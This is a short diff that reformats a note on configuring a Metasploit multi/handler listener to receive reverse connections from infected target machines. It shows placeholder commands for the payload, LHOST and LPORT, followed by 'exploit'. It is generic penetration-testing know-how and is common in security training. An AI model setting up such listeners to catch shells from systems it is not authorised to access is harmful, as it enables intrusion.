@@ -1,7 +1,7 @@
-# Setting a handler is an essential part in exploiting target machines, for that it's the listener that listens for a reverse connection attempted by the target after it's infected.
+// Setting a handler is an essential part in exploiting target machines, for that it's the listener that listens for a reverse connection attempted by the target after it's infected.
 
-use multi/handler
-set PAYLOAD [Used payload]
-set LHOST [IP]
-set LPORT [portnum]
-exploit
+-use multi/handler
+- set PAYLOAD [Used payload]
+- set LHOST [IP]
+- set LPORT [portnum]
+- exploit
